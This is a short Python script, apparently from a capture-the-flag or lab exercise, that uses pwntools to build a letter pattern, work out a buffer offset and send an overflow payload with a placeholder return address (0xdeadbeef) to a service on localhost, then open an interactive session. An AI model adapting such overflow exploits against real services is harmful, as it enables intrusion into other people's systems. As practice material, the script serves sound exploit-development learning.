from pwn import *

LOCAL = True

c = ""
for i in range(100):
    c += chr(ord('A')+i//4)
with open('payload','w') as f:
    f.write(c + '\n')

padding = c.index(chr(0x54))
print(padding)

r = remote('localhost', 4200)

r.sendline(cyclic(padding) + p32(0xdeadbeef))
r.interactive()
